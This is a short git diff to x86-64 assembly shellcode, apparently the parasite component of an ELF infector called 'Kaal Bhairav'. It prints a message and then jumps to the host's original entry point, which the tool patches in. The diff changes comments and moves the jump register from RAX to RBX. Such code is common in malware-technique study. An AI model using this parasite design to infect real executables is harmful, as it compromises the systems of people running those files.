@@ -3,7 +3,8 @@ BITS 64
 ; Author : Abhinav Thakur
 ; Email  : compilepeace@gmail.com
 
-; Description : Shellcode prints a message and transfers control to a specified address
+; Description : Shellcode prints a message and transfers control to a specified address (to be patched
+;               by Kaal Bhairav with entry point address of LSB Executable - ET_EXEC)
 
 
 global _start
@@ -14,7 +15,7 @@ section .text
 
 _start:
 
-	; Save register state
+	; Save register state, RBX can be safely used
 	push rax
 	push rcx
 	push rdx
@@ -50,6 +51,6 @@ parasite:
 
 	
 	; jmp to original host entry point (to be patched by kaal bhairav)
-	mov	rax, 0xAAAAAAAAAAAAAAAA		
-	jmp	rax
+	mov	rbx, 0xAAAAAAAAAAAAAAAA		
+	jmp	rbx
 
